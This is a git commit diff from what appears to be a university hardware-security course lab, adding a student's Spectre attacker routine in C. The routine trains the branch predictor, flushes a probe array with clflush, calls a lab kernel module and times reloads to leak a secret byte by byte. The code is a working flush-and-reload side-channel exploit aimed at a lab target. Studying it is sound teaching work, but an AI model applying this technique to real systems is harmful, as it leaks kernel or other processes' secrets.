a57f5a85c5853fc3f788e218ff7d11a3a79673b3
Andre Alain Kudzo Rastrelly <arastrel@burnsville.cs.unc.edu>
2026-04-08 23:31:56 -0400

    part 3 beginning implementation

--- hwsec-course/lab-spectre/part3-src/attacker-part3.c
+++ hwsec-course/lab-spectre/part3-src/attacker-part3.c
@@ -11,6 +11,10 @@
 #include "labspectre.h"
 #include "labspectreipc.h"
 
+#define ATTEMPTS 1500
+#define THRESHOLD 140
+#define TRAINING 300
+
 /*
  * call_kernel_part3
  * Performs the COMMAND_PART3 call in the kernel
@@ -29,6 +33,50 @@ static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t 
     write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
 }
 
+static unsigned char leak_one_byte_part3(int kernel_fd, char *shared_memory, size_t offset) {
+    int candidates[256] = {0};
+    int access_times[256] = {0};
+
+    // TRAIN
+    for (int i = 0; i < TRAINING; i++) {
+        call_kernel_part3(kernel_fd, shared_memory, 3);
+    }
+
+    // BEGIN
+    for (int attempt = 0; attempt < ATTEMPTS; attempt++) { // ATTEMPTS defined above, can increase/decrease for fine tuning
+
+        // FLUSH
+        for (int i = 0; i < 256; i++) {
+            clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]); // page table size 4096, loop goes through and flushes all pages
+        }
+        for (int i = 0; i < 256; i++) {
+            clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]); // page table size 4096, loop goes through and flushes all pages
+        }
+
+        // VICTIM
+        call_kernel_part3(kernel_fd, shared_memory, offset); // run victim process!!
+
+        // RELOAD 
+        for (int i = 0; i < 256; i++) {
+            int mix_i = ((i * 167) + 13) & 255; // mixed order to counter prefetching optimization
+            uint64_t dt = time_access(&shared_memory[mix_i * SHD_SPECTRE_LAB_PAGE_SIZE]); // measure access time to mix_i-th page
+            access_times[mix_i] = dt;
+            if (dt < THRESHOLD) {
+                candidates[mix_i]++;
+            }
+        
+        }
+    }
+    // find candidate for fastest access time, meaning victim accessed it
+        int best = 0;
+        for (int i = 1; i < 256; i++) {
+            if (candidates[i] > candidates[best]) {
+                best = i;
+            }
+        } 
+    return (unsigned char)best;
+}
+
 /*
  * run_attacker
  *
@@ -45,11 +93,13 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
 
-        // [Part 3]- Fill this in!
-        // leaked_byte = ??
+        // [Part 2]- Fill this in!
 
+        leaked_byte = (char)leak_one_byte_part3(kernel_fd, shared_memory, current_offset);
         leaked_str[current_offset] = leaked_byte;
+
         if (leaked_byte == '\x00') {
+            printf("\nBroke at offset: %ld", current_offset);
             break;
         }
     }
